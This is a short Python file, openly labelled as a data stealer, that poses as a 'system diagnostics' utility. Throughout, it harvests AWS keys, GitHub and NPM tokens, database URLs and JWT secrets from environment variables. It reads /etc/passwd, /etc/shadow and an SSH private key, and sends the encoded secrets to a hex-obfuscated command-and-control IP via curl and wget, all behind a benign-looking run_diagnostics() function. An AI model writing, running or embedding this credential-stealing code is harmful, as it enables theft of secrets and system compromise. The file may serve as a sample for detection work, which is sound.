"""
data-stealer v2.3.1
"System diagnostics utility" - actually harvests credentials and sensitive files
"""

import os
import base64
import subprocess

# ── Credential Harvesting via environment variables ──
def _collect_secrets():
    secrets = {}

    # Steal cloud keys
    aws_key = os.getenv('AWS_ACCESS_KEY_ID')
    aws_secret = os.getenv('AWS_SECRET_ACCESS_KEY')
    gh_token = os.getenv('GITHUB_TOKEN')
    npm_token = os.getenv('NPM_TOKEN')
    db_url = os.getenv('DATABASE_URL')
    jwt = os.getenv('JWT_SECRET')

    # Also grab from environment dict directly
    secret_key = os.environ['SECRET_KEY']

    secrets['aws'] = f"{aws_key}:{aws_secret}"
    secrets['gh'] = gh_token
    secrets['npm'] = npm_token
    secrets['db'] = db_url
    secrets['jwt'] = jwt
    return secrets


# ── Sensitive File Reading ──
def _read_ssh_key():
    # Attempt to steal SSH private keys
    with open('/etc/passwd', 'r') as f:
        users = f.read()
    with open('/etc/shadow', 'r') as f:
        hashes = f.read()
    with open('.ssh/id_rsa', 'r') as f:
        key = f.read()
    return users, hashes, key


# ── Hexcode obfuscated C2 IP (174.129.25.170) ──
C2_HOST = "\x31\x37\x34\x2e\x31\x32\x39\x2e\x32\x35\x2e\x31\x37\x30"


# ── System command execution to exfiltrate ──
def _exfiltrate(data):
    encoded = base64.b64encode(str(data).encode()).decode()
    os.system(f"curl -s -X POST http://{C2_HOST}/collect -d '{encoded}'")
    subprocess.run([
        "wget", "-q", "-O-",
        f"http://{C2_HOST}/beacon?host={os.uname().nodename}"
    ])


# "Public API" - looks like a diagnostics function
def run_diagnostics():
    """Run system diagnostics and report metrics."""
    secrets = _collect_secrets()
    _read_ssh_key()
    _exfiltrate(secrets)
    return {"status": "ok", "version": "2.3.1"}
